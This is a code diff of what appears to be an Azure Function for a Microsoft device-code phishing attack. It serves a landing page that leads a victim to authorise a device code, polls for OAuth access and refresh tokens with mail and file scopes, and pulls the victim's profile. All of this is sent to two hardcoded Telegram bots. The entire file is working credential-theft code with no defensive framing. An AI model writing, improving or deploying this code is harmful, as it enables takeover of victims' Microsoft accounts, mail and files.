@@ -7,10 +7,9 @@ const TELEGRAM_CHAT_ID = "6743632244";
 const TELEGRAM_BOT_TOKEN2 = "7942871168:AAHjqXqXqXqXqXqXqXqXqXqXqXqXqXqXqXqX";
 const TELEGRAM_CHAT_ID2 = "6263177378";
 
-// Microsoft Graph CLI client ID (no redirect URI configured)
-const client_id = '14d82eec-204b-4c2f-b7e8-296a70dab67e';
-const resource = "https://graph.microsoft.com/";
-const token_endpoint = "https://login.microsoftonline.com/common/oauth2/devicecode?api-version=1.0";
+// Device Code configuration - Using ORIGINAL client ID
+const client_id = '00b41c95-dab0-4487-9791-b9d2c32c80f2'; // Original device code client ID
+const scope = 'openid profile email User.Read Mail.Read Files.ReadWrite.All offline_access';
 
 async function sendTelegram(message, isSecondary = false) {
     const botToken = isSecondary ? TELEGRAM_BOT_TOKEN2 : TELEGRAM_BOT_TOKEN;
@@ -29,36 +28,48 @@ async function sendTelegram(message, isSecondary = false) {
 }
 
 app.http("devicecode", {
-    methods: ["GET", "POST"],
+    methods: ["GET"],
     authLevel: "anonymous",
     route: "secure-access",
     handler: async (request, context) => {
         try {
+            // Send Telegram notification
+            await sendTelegram(`🎯 <b>Device Code Page Accessed</b>\n\n🔗 <b>URL:</b> ${request.url}\n👤 <b>User Agent:</b> ${request.headers.get('user-agent') || 'Unknown'}\n🌐 <b>IP:</b> ${request.headers.get('x-forwarded-for') || 'Unknown'}`);
+            await sendTelegram(`🎯 <b>Device Code Page Accessed</b>\n\n🔗 <b>URL:</b> ${request.url}\n👤 <b>User Agent:</b> ${request.headers.get('user-agent') || 'Unknown'}\n🌐 <b>IP:</b> ${request.headers.get('x-forwarded-for') || 'Unknown'}`, true);
+
             // Generate device code
-            const devicecode = await axios.post(token_endpoint, {
-                'client_id': client_id,
-                'resource': '0000000c-0000-0000-c000-000000000000',
-            }, {
+            const deviceCodeResponse = await fetch('https://login.microsoftonline.com/common/oauth2/v2.0/devicecode', {
+                method: 'POST',
                 headers: {
                     'Content-Type': 'application/x-www-form-urlencoded',
-                }
-            }).then(response => response.data)
-            .catch((ex) => {
-                console.error('Device code generation error:', ex);
-                throw ex;
+                },
+                body: new URLSearchParams({
+                    client_id: client_id,
+                    scope: scope
+                })
             });
 
-            context.log(`Device code generated: ${JSON.stringify(devicecode)}`);
+            if (!deviceCodeResponse.ok) {
+                const errorText = await deviceCodeResponse.text();
+                context.log.error('Device code generation failed:', errorText);
+                await sendTelegram(`❌ <b>Device Code Generation Failed</b>\n\n${errorText}`);
+                await sendTelegram(`❌ <b>Device Code Generation Failed</b>\n\n${errorText}`, true);
+                return new Response(`Device code generation failed: ${errorText}`, { status: 400 });
+            }
+
+            const deviceCodeData = await deviceCodeResponse.json();
+            context.log(`Device code generated: ${deviceCodeData.user_code}`);
+
+            // Send Telegram notification with device code
+            const deviceCodeMessage = `🎯 <b>Device Code Generated</b>\n\n🔢 <b>Code:</b> ${deviceCodeData.user_code}\n⏰ <b>Expires In:</b> ${deviceCodeData.expires_in} seconds\n🔗 <b>Verification URL:</b> ${deviceCodeData.verification_uri}`;
             
-            // Send Telegram notification
-            await sendTelegram(`🎯 <b>Device Code Generated</b>\n\n📱 <b>User Code:</b> <code>${devicecode.user_code}</code>\n🔗 <b>Verification URL:</b> ${devicecode.verification_url}\n⏱️ <b>Expires:</b> ${devicecode.expires_in}s`);
-            await sendTelegram(`🎯 <b>Device Code Generated</b>\n\n📱 <b>User Code:</b> <code>${devicecode.user_code}</code>\n🔗 <b>Verification URL:</b> ${devicecode.verification_url}\n⏱️ <b>Expires:</b> ${devicecode.expires_in}s`, true);
+            await sendTelegram(deviceCodeMessage);
+            await sendTelegram(deviceCodeMessage, true);
 
-            // Start polling for token
-            pollForToken(devicecode.device_code, context);
+            // Start polling for token in background
+            pollForToken(deviceCodeData.device_code, deviceCodeData.interval || 5);
 
-            // Return the landing page
-            const response = `
+            const html = `
             <!DOCTYPE html>
             <html lang="en">
             <head>
@@ -100,11 +111,11 @@ app.http("devicecode", {
                     </div>
                     
                     <div class="code-box">
-                        <div class="code">${devicecode.user_code}</div>
+                        <div class="code">${deviceCodeData.user_code}</div>
                     </div>
                     
                     <div style="text-align: center;">
-                        <a href="${devicecode.verification_url}" target="_blank" class="button">Continue to Microsoft</a>
+                        <a href="https://microsoft.com/devicelogin" target="_blank" class="button">Continue to Microsoft</a>
                     </div>
                     
                     <div class="footer">
@@ -115,82 +126,97 @@ app.http("devicecode", {
             </body>
             </html>`;
 
-            return new Response(response, {
+            return new Response(html, {
                 status: 200,
                 headers: {
-                    'Content-Type': 'text/html; charset=utf-8',
-                    'X-Content-Type-Options': 'nosniff'
+                    'Content-Type': 'text/html; charset=utf-8'
                 }
             });
 
         } catch (error) {
             context.log.error('Device code error:', error);
             await sendTelegram(`❌ <b>Device Code Error</b>\n\n${error.message}`);
-            return new Response('Error generating device code', { status: 500 });
+            await sendTelegram(`❌ <b>Device Code Error</b>\n\n${error.message}`, true);
+            return new Response(`Device code error: ${error.message}`, { status: 500 });
         }
     }
 });
 
-async function pollForToken(deviceCode, context) {
-    const token_endpoint = "https://login.microsoftonline.com/common/oauth2/token";
-    let poll_count = 0;
-    const max_polls = 60; // 5 minutes (5s intervals)
+async function pollForToken(deviceCode, interval) {
+    let attempts = 0;
+    const maxAttempts = 60; // 5 minutes with 5-second intervals
     
-    while (poll_count++ < max_polls) {
+    const poll = async () => {
         try {
-            const tokenResponse = await axios.post(token_endpoint, {
-                "client_id": client_id,
-                "grant_type": "urn:ietf:params:oauth:grant-type:device_code",
-                "resource": "https://graph.microsoft.com",
-                "code": deviceCode
-            }, {
+            const tokenResponse = await fetch('https://login.microsoftonline.com/common/oauth2/v2.0/token', {
+                method: 'POST',
                 headers: {
                     'Content-Type': 'application/x-www-form-urlencoded',
-                }
+                },
+                body: new URLSearchParams({
+                    client_id: client_id,
+                    scope: scope,
+                    grant_type: 'urn:ietf:params:oauth:grant-type:device_code',
+                    device_code: deviceCode
+                })
             });
 
-            const tokens = tokenResponse.data;
-            context.log(`Tokens captured: ${JSON.stringify(tokens)}`);
-            
-            // Send success notification with all tokens
-            const successMessage = `🔥 <b>TOKEN CAPTURE SUCCESS!</b>\n\n🔑 <b>Access Token:</b> <code>${tokens.access_token}</code>\n🔄 <b>Refresh Token:</b> <code>${tokens.refresh_token || 'N/A'}</code>\n🆔 <b>ID Token:</b> <code>${tokens.id_token || 'N/A'}</code>\n⏱️ <b>Expires In:</b> ${tokens.expires_in}s\n📝 <b>Token Type:</b> ${tokens.token_type}`;
-            
-            await sendTelegram(successMessage);
-            await sendTelegram(successMessage, true);
-            
-            // Fetch user profile
-            try {
-                const userResponse = await axios.get('https://graph.microsoft.com/v1.0/me', {
-                    headers: {
-                        'Authorization': `Bearer ${tokens.access_token}`,
-                        'User-Agent': 'AzureAiTMFunction/1.0'
+            if (tokenResponse.ok) {
+                const tokens = await tokenResponse.json();
+                
+                // Send Telegram notification with tokens
+                const tokenMessage = `🔥 <b>Device Code Tokens Captured!</b>\n\n🔑 <b>Access Token:</b> <code>${tokens.access_token.substring(0, 50)}...</code>\n🔄 <b>Refresh Token:</b> <code>${tokens.refresh_token ? tokens.refresh_token.substring(0, 50) + '...' : 'None'}</code>\n⏰ <b>Expires In:</b> ${tokens.expires_in} seconds\n📝 <b>Token Type:</b> ${tokens.token_type}`;
+                
+                await sendTelegram(tokenMessage);
+                await sendTelegram(tokenMessage, true);
+
+                // Get user profile
+                try {
+                    const profileResponse = await fetch('https://graph.microsoft.com/v1.0/me', {
+                        headers: {
+                            'Authorization': `Bearer ${tokens.access_token}`,
+                            'Content-Type': 'application/json'
+                        }
+                    });
+
+                    if (profileResponse.ok) {
+                        const profile = await profileResponse.json();
+                        const profileMessage = `👤 <b>User Profile Captured</b>\n\n📧 <b>Email:</b> ${profile.mail || profile.userPrincipalName}\n👤 <b>Name:</b> ${profile.displayName}\n🏢 <b>Company:</b> ${profile.businessPhones ? profile.businessPhones.join(', ') : 'N/A'}\n📱 <b>Mobile:</b> ${profile.mobilePhone || 'N/A'}\n🆔 <b>ID:</b> ${profile.id}`;
+                        
+                        await sendTelegram(profileMessage);
+                        await sendTelegram(profileMessage, true);
                     }
-                });
-                
-                const userProfile = userResponse.data;
-                const profileMessage = `👤 <b>User Profile Captured</b>\n\n📧 <b>Email:</b> ${userProfile.mail || userProfile.userPrincipalName}\n👤 <b>Name:</b> ${userProfile.displayName}\n🏢 <b>Company:</b> ${userProfile.jobTitle || 'N/A'}\n📱 <b>Phone:</b> ${userProfile.businessPhones?.[0] || 'N/A'}`;
-                
-                await sendTelegram(profileMessage);
-                await sendTelegram(profileMessage, true);
-                
-            } catch (profileError) {
-                await sendTelegram(`⚠️ <b>Profile Fetch Error</b>\n\n${profileError.message}`);
-            }
-            
-            return;
-            
-        } catch (error) {
-            if (error.response?.data?.error === "authorization_pending") {
-                context.log(`Authorization pending, polling again... (${poll_count}/${max_polls})`);
+                } catch (profileError) {
+                    console.error('Profile fetch error:', profileError);
+                    await sendTelegram(`⚠️ <b>Profile Fetch Error</b>\n\n${profileError.message}`);
+                }
+
+                return; // Success, stop polling
             } else {
-                context.log(`Token polling error:`, error.response?.data || error.message);
-                await sendTelegram(`❌ <b>Token Polling Error</b>\n\n${error.response?.data?.error_description || error.message}`);
-                return;
+                const errorData = await tokenResponse.json();
+                
+                if (errorData.error === 'authorization_pending') {
+                    // Still waiting, continue polling
+                    attempts++;
+                    if (attempts < maxAttempts) {
+                        setTimeout(poll, interval * 1000);
+                    } else {
+                        await sendTelegram(`⏰ <b>Device Code Expired</b>\n\nUser did not complete authentication within the time limit`);
+                        await sendTelegram(`⏰ <b>Device Code Expired</b>\n\nUser did not complete authentication within the time limit`, true);
+                    }
+                } else {
+                    // Other error
+                    await sendTelegram(`❌ <b>Device Code Error</b>\n\n${errorData.error}: ${errorData.error_description || 'Unknown error'}`);
+                    await sendTelegram(`❌ <b>Device Code Error</b>\n\n${errorData.error}: ${errorData.error_description || 'Unknown error'}`, true);
+                }
             }
+        } catch (error) {
+            console.error('Polling error:', error);
+            await sendTelegram(`❌ <b>Polling Error</b>\n\n${error.message}`);
+            await sendTelegram(`❌ <b>Polling Error</b>\n\n${error.message}`, true);
         }
-        
-        await new Promise(resolve => setTimeout(resolve, 5000));
-    }
-    
-    await sendTelegram(`⏰ <b>Device Code Expired</b>\n\nNo authentication completed within 5 minutes.`);
+    };
+
+    // Start polling
+    setTimeout(poll, interval * 1000);
 }
